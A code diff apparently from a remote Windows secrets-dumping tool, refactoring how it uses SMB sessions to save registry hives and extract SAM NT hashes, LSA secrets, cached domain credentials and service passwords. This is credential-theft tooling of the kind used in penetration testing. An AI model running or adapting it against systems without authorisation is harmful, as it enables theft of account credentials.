@@ -24,6 +24,7 @@ from ms_rrp.operations.base_reg_save_key import base_reg_save_key, BaseRegSaveKe
 from ms_scmr import MS_SCMR_ABSTRACT_SYNTAX, MS_SCMR_PIPE_NAME
 from ms_scmr.operations.r_open_sc_manager_w import r_open_sc_manager_w, ROpenSCManagerWRequest
 from msdsalgs.ntstatus_value import StatusLogonFailureError, StatusBadNetworkNameError
+from pyutils.my_string import underline, text_align_delimiter
 from Registry.Registry import Registry
 
 from dump_lsa import dump_lsa_secrets
@@ -39,7 +40,6 @@ LOG = getLogger(__name__)
 # TODO: Move to another library? `ms_rrp` as contrib?
 async def dump_reg(
     rpc_connection: RPCConnection,
-    smb_connection: SMBv2Connection,
     smb_session: SMBv2Session,
     root_key_handle: bytes,
     tree_id: int,
@@ -65,16 +65,14 @@ async def dump_reg(
 
     create_kwargs = dict(
         path=PureWindowsPath(*save_path.parts[1:]),
-        session=smb_session,
         tree_id=tree_id,
         create_options=CreateOptions(non_directory_file=True, delete_on_close=delete_file_on_close),
         desired_access=FilePipePrinterAccessMask(file_read_data=True, delete=delete_file_on_close)
     )
-    async with smb_connection.create(**create_kwargs) as create_response:
-        return await smb_connection.read(
+    async with smb_session.create(**create_kwargs) as create_response:
+        return await smb_session.read(
             file_id=create_response.file_id,
             file_size=create_response.endof_file,
-            session=smb_session,
             tree_id=tree_id
         )
 
@@ -92,12 +90,8 @@ async def resolve_service_credentials_with_rpc_connection(
         )
 
 
-async def resolve_service_credentials(
-    smb_connection: SMBv2Connection,
-    smb_session: SMBv2Session,
-    policy_secrets: Dict[str, bytes]
-) -> Dict[str, str]:
-    async with smb_connection.make_smbv2_transport(session=smb_session, pipe=MS_SCMR_PIPE_NAME) as (r, w):
+async def resolve_service_credentials(smb_session: SMBv2Session, policy_secrets: Dict[str, bytes]) -> Dict[str, str]:
+    async with smb_session.make_smbv2_transport(pipe=MS_SCMR_PIPE_NAME) as (r, w):
         async with RPCConnection(reader=r, writer=w) as rpc_connection:
             await rpc_connection.bind(
                 presentation_context_list=ContextList([
@@ -112,7 +106,6 @@ async def resolve_service_credentials(
 
 
 async def dump_remote_windows_secrets(
-    smb_connection: SMBv2Connection,
     smb_session: SMBv2Session,
     skip_lsa_secrets: bool = False,
     skip_sam_secrets: bool = False,
@@ -127,7 +120,6 @@ async def dump_remote_windows_secrets(
     `BaseRegSaveKey` RRP operation, and are then retrieved via the SMB READ command, after which the files on disk are
     deleted.
 
-    :param smb_connection: An SMB connection with which to remotely dump the Windows secrets.
     :param smb_session: An SMB session with which to remotely dump the Windows secrets.
     :param skip_lsa_secrets: Whether to skip the extraction of LSA secrets.
     :param skip_sam_secrets: Whether to skip the extraction of SAM secrets.
@@ -140,8 +132,8 @@ async def dump_remote_windows_secrets(
     if skip_lsa_secrets and skip_sam_secrets:
         return None, None, None
 
-    async with smb_connection.tree_connect(share_name=dump_reg_share_name, session=smb_session) as (tree_id, _):
-        async with smb_connection.make_smbv2_transport(session=smb_session, pipe=MS_RRP_PIPE_NAME) as (r, w):
+    async with smb_session.tree_connect(share_name=dump_reg_share_name) as (tree_id, _):
+        async with smb_session.make_smbv2_transport(pipe=MS_RRP_PIPE_NAME) as (r, w):
             async with RPCConnection(reader=r, writer=w) as rpc_connection:
                 await rpc_connection.bind(
                     presentation_context_list=ContextList([
@@ -160,7 +152,6 @@ async def dump_remote_windows_secrets(
 
                     lsa_data: bytes = await dump_reg(
                         rpc_connection=rpc_connection,
-                        smb_connection=smb_connection,
                         smb_session=smb_session,
                         root_key_handle=local_machine_key_handle,
                         tree_id=tree_id,
@@ -170,7 +161,6 @@ async def dump_remote_windows_secrets(
 
                     security_data: Optional[bytes] = await dump_reg(
                         rpc_connection=rpc_connection,
-                        smb_connection=smb_connection,
                         smb_session=smb_session,
                         root_key_handle=local_machine_key_handle,
                         tree_id=tree_id,
@@ -180,7 +170,6 @@ async def dump_remote_windows_secrets(
 
                     sam_data: Optional[bytes] = await dump_reg(
                         rpc_connection=rpc_connection,
-                        smb_connection=smb_connection,
                         smb_session=smb_session,
                         root_key_handle=local_machine_key_handle,
                         tree_id=tree_id,
@@ -222,7 +211,6 @@ async def pre_dump_remote_windows_secrets(
             await smb_connection.negotiate()
             async with smb_connection.setup_session(username=username, authentication_secret=authentication_secret) as smb_session:
                 sam_entries, domain_cached_credentials, policy_secrets = await dump_remote_windows_secrets(
-                    smb_connection=smb_connection,
                     smb_session=smb_session,
                     skip_lsa_secrets=skip_lsa_secrets,
                     skip_sam_secrets=skip_sam_secrets,
@@ -231,7 +219,6 @@ async def pre_dump_remote_windows_secrets(
                 )
 
                 account_name_to_password: Dict[str, str] = await resolve_service_credentials(
-                    smb_connection=smb_connection,
                     smb_session=smb_session,
                     policy_secrets=policy_secrets
                 ) if (not skip_lsa_secrets and not skip_resolve_service_passwords) else None
@@ -240,42 +227,54 @@ async def pre_dump_remote_windows_secrets(
         '\n\n'.join(
             section
             for section in [
-                (
-                    'SAM entries\n===========\n\n'
-                    + (
-                        '\n\n'.join(
-                            f'Account name: {sam_entry.account_name}\n'
-                            f'NT hash: {sam_entry.nt_hash.hex()}'
-                            for sam_entry in sam_entries if sam_entry.nt_hash is not None
+                text_align_delimiter(
+                    text=(
+                        f"{underline(string='SAM entries')}\n\n"
+                        + (
+                            '\n\n'.join(
+                                f'Account name: {sam_entry.account_name}\n'
+                                f'NT hash: {sam_entry.nt_hash.hex()}'
+                                for sam_entry in sam_entries if sam_entry.nt_hash is not None
+                            )
                         )
-                    )
+                    ),
+                    put_non_match_after_delimiter=False
                 ) if sam_entries else None,
-                (
-                    'Service credentials\n===================\n\n'
-                    + (
-                        '\n\n'.join(
-                            f'Account name: {account_name}\n'
-                            f'Password: {password}'
-                            for account_name, password in account_name_to_password.items()
+                text_align_delimiter(
+                    text=(
+                        f"{underline(string='Service credentials')}\n\n"
+                        + (
+                            '\n\n'.join(
+                                f'Account name: {account_name}\n'
+                                f'Password: {password}'
+                                for account_name, password in account_name_to_password.items()
+                            )
                         )
-                    )
+                    ),
+                    put_non_match_after_delimiter=False
                 ) if account_name_to_password else None,
-                (
-                    'Domain cached credentials\n=========================\n\n'
-                    + (
-                        '\n'.join(
-                            str(domain_cached_credentials_entry)
-                            for domain_cached_credentials_entry in domain_cached_credentials
+                text_align_delimiter(
+                    text=(
+                        f"{underline(string='Domain cached credentials')}\n\n"
+                        + (
+                            '\n'.join(
+                                str(domain_cached_credentials_entry)
+                                for domain_cached_credentials_entry in domain_cached_credentials
+                            )
                         )
-                    )
+                    ),
+                    put_non_match_after_delimiter=False
                 ) if domain_cached_credentials else None,
-                (
-                    'Policy secrets\n==============\n\n'
-                    + (
-                        '\n'.join(
-                            f'{key}: {value.hex()}' for key, value in policy_secrets.items()
+                text_align_delimiter(
+                    text=(
+                        f"{underline(string='Policy secrets')}\n\n"
+                        + (
+                            '\n'.join(
+                                f'{key}: {value.hex()}' for key, value in policy_secrets.items()
+                            )
                         )
-                    )
+                    ),
+                    put_non_match_after_delimiter=False
                 ) if policy_secrets else None,
             ]
             if section
